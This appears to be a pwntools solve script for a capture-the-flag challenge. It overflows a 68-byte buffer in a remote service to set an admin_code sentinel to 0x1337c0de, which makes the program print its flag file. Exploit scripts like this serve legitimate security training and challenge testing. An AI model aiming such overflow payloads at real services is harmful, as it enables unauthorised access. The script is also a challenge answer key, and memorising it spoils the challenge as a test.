import os
from pwn import *

# `pwnmake check` sets HOST/PORT; keep sensible defaults for manual runs.
HOST = os.environ.get('HOST', 'localhost')
PORT = int(os.environ.get('PORT', 25601))

#p = process('.build/miami')
p = remote(HOST, PORT)

p.recvuntil(b': ')

# Overflow buf[68] into the admin_code sentinel so it equals 0x1337c0de,
# which makes vuln() call read_flag() and print flag.txt for us.
payload = b'A' * 0x4c + p32(0x1337c0de)

p.sendline(payload)

# read_flag() prints the flag to stdout, then main() returns and the
# connection closes, so recvall() captures it.
print(p.recvall(timeout=5).decode(errors='replace'))
